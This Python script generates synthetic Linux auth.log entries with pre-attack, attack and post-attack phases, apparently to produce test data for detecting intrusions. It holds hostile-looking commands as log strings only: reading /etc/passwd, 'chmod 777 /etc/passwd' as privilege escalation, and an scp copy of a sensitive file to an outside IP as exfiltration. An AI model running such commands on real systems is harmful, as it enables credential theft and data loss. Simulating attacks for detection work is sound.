import random
from datetime import datetime, timedelta

# List of sample users
users = ['alice', 'bob', 'charlie', 'dave', 'eve']
commands = ['ls', 'pwd', 'cd /home', 'mkdir test', 'rm -rf /tmp/test', 'cat /etc/passwd', 'echo "Hello World"', 'chmod 755 /usr/local/bin', 'cp file1 file2', 'mv file1 file2']
su_commands = ['su - root', 'su - bob']
sudo_commands = ['apt update', 'apt upgrade', 'systemctl restart apache2', 'adduser testuser', 'deluser testuser']
attack_types = ['Failed password', 'Invalid user', 'PAM authentication failure', 'Hydra attack', 'Data exfiltration', 'Privilege escalation']

# Generate random datetime within a range
def random_datetime(start, end):
    return start + timedelta(seconds=random.randint(0, int((end - start).total_seconds())))

# Function to generate simulated auth.log entries
def generate_auth_log_entries(total_entries, attack_start, attack_end):
    start_time = datetime(2024, 1, 1, 0, 0, 0)
    end_time = start_time + timedelta(days=120)
    
    auth_log_entries = []
    entries_per_phase = total_entries // 3

    phases = [
        ('pre-attack', start_time, attack_start),
        ('attack', attack_start, attack_end),
        ('post-attack', attack_end, end_time)
    ]
    
    for phase, phase_start, phase_end in phases:
        for _ in range(entries_per_phase):
            timestamp = random_datetime(phase_start, phase_end)
            log_time = timestamp.strftime('%b %d %H:%M:%S')
            host = "server"
            process = random.choice(['sshd', 'sudo', 'su'])
            pid = random.randint(1000, 5000)
            user = random.choice(users)
            
            if phase == 'attack':
                activity_type = 'attack'
            else:
                activity_type = random.choice(['command', 'new_user', 'del_user', 'passwd_change', 'su', 'sudo'])
                
            if activity_type == 'command':
                command = random.choice(commands)
                log_entry = f"{log_time} {host} {process}[{pid}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER={user} ; COMMAND={command}"
            
            elif activity_type == 'new_user':
                new_user = f"user{random.randint(100, 999)}"
                log_entry = f"{log_time} {host} useradd[0]: new user: name={new_user}, uid={random.randint(1000, 9999)}, gid=100, home=/home/{new_user}, shell=/bin/bash"
            
            elif activity_type == 'del_user':
                deleted_user = f"user{random.randint(100, 999)}"
                log_entry = f"{log_time} {host} userdel[0]: delete user {deleted_user}"
            
            elif activity_type == 'passwd_change':
                log_entry = f"{log_time} {host} passwd[{pid}]: password for {user} changed by {user}"
            
            elif activity_type == 'su':
                su_command = random.choice(su_commands)
                log_entry = f"{log_time} {host} su[{pid}]: Successful su for {user} by root"
            
            elif activity_type == 'sudo':
                sudo_command = random.choice(sudo_commands)
                log_entry = f"{log_time} {host} sudo[{pid}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={sudo_command}"
            
            elif activity_type == 'attack':
                attack_type = random.choice(attack_types)
                if attack_type == 'Failed password':
                    ip = f"{random.randint(100, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    log_entry = f"{log_time} {host} sshd[{pid}]: Failed password for {random.choice(['invalid user', user])} from {ip} port {random.randint(1000, 60000)} ssh2"
                elif attack_type == 'Invalid user':
                    ip = f"{random.randint(100, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    log_entry = f"{log_time} {host} sshd[{pid}]: Invalid user {random.choice(['admin', 'guest', 'test'])} from {ip} port {random.randint(1000, 60000)}"
                elif attack_type == 'PAM authentication failure':
                    log_entry = f"{log_time} {host} sshd[{pid}]: PAM authentication failure for {user}"
                elif attack_type == 'Hydra attack':
                    attempts = random.randint(5, 15)
                    ip = f"{random.randint(100, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    for _ in range(attempts):
                        attempt_user = random.choice(users + ['invalid_user'])
                        log_entry = f"{log_time} {host} sshd[{pid}]: Failed password for {attempt_user} from {ip} port {random.randint(1000, 60000)} ssh2"
                        auth_log_entries.append(log_entry)
                    successful_user = random.choice(users)
                    log_entry = f"{log_time} {host} sshd[{pid}]: Accepted password for {successful_user} from {ip} port {random.randint(1000, 60000)} ssh2"
                    auth_log_entries.append(log_entry)
                    log_entry = f"{log_time} {host} {process}[{pid}]: Detected data exfiltration attempt by {successful_user} using command 'scp /data/sensitive_file {successful_user}@{ip}:/remote/dir'"
                elif attack_type == 'Data exfiltration':
                    ip = f"{random.randint(100, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    log_entry = f"{log_time} {host} {process}[{pid}]: Detected data exfiltration attempt by {user} using command 'scp /data/sensitive_file {user}@{ip}:/remote/dir'"
                elif attack_type == 'Privilege escalation':
                    log_entry = f"{log_time} {host} sudo[{pid}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=chmod 777 /etc/passwd"
            
            auth_log_entries.append(log_entry)
    
    return auth_log_entries

# Example usage: Generate 20,000 simulated entries with an attack period
total_entries = 20000
attack_start = datetime(2024, 2, 15, 0, 0, 0)
attack_end = datetime(2024, 3, 15, 0, 0, 0)

simulated_logs = generate_auth_log_entries(total_entries, attack_start, attack_end)

# Print a sample of the simulated logs
for log in simulated_logs[:10]:  # Print only the first 10 for brevity
    print(log)

# Write the logs to a file
with open('/home/kali/PythonProject/simulated_auth.log', 'w') as f:
    for log in simulated_logs:
        f.write(log + '\n')
